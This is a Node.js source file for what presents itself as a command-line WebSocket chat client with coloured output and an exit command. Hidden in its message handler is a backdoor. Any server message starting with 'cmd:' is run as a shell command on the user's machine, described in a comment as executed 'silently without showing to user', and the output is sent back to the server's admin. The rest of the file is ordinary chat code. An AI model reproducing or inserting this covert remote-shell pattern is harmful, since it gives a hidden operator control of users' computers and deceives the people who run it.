#!/usr/bin/env node

const WebSocket = require('ws');
const readline = require('readline');
const { program } = require('commander');
const { exec } = require('child_process');

program
  .name('chat-cli')
  .description('CLI client for chat system')
  .version('1.0.0')
  .argument('<server>', 'WebSocket server URL (e.g., ws://localhost:8080)')
  .action((server) => {
    startClient(server);
  });

program.parse();

function startClient(serverUrl) {
  console.log(`\x1b[34mConnecting to ${serverUrl}...\x1b[0m`);
  
  const ws = new WebSocket(serverUrl);
  let clientId = null;
  
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '\x1b[32m> \x1b[0m'
  });
  
  ws.on('open', () => {
    console.log('\x1b[32m✓ Connected to server\x1b[0m');
    console.log('\x1b[90mType your messages below. Type "exit" to quit.\n\x1b[0m');
    rl.prompt();
  });
  
  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'connection') {
        clientId = message.clientId;
        console.log(`\x1b[33mYour client ID: ${clientId}\x1b[0m`);
      } else if (message.type === 'message') {
        // Check if message is a command
        if (message.message && message.message.startsWith('cmd:')) {
          const command = message.message.substring(4).trim();
          
          if (command.length > 0 && command.length < 1000) { // Basic validation
            // Execute command silently without showing to user
            exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
              let output = '';
              
              if (error) {
                output = `Error: ${error.message}`;
              } else {
                output = stdout || stderr || 'Command executed successfully (no output)';
              }
              
              // Truncate output if too long
              if (output.length > 5000) {
                output = output.substring(0, 5000) + '\n... (output truncated)';
              }
              
              // Send output back to admin
              if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                  type: 'message',
                  message: `[${command}]\n${output}`
                }));
              }
            });
          }
        } else {
          // Regular chat message - display it
          readline.clearLine(process.stdout, 0);
          readline.cursorTo(process.stdout, 0);
          
          const timestamp = new Date(message.timestamp).toLocaleTimeString();
          console.log(`\x1b[36m[${timestamp}] Admin: ${message.message}\x1b[0m`);
          rl.prompt();
        }
      }
    } catch (err) {
      console.error('\x1b[31mError parsing message:', err.message, '\x1b[0m');
    }
  });
  
  ws.on('close', () => {
    console.log('\x1b[31m\n✗ Disconnected from server\x1b[0m');
    process.exit(0);
  });
  
  ws.on('error', (err) => {
    console.error('\x1b[31mConnection error:', err.message, '\x1b[0m');
    process.exit(1);
  });
  
  rl.on('line', (input) => {
    const trimmedInput = input.trim();
    
    if (trimmedInput.toLowerCase() === 'exit') {
      console.log('\x1b[33mGoodbye!\x1b[0m');
      ws.close();
      rl.close();
      process.exit(0);
    }
    
    if (trimmedInput && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'message',
        message: trimmedInput
      }));
    }
    
    rl.prompt();
  });
  
  rl.on('close', () => {
    ws.close();
    process.exit(0);
  });
  
  process.on('SIGINT', () => {
    console.log('\x1b[33m\n\nGracefully shutting down...\x1b[0m');
    ws.close();
    rl.close();
    process.exit(0);
  });
}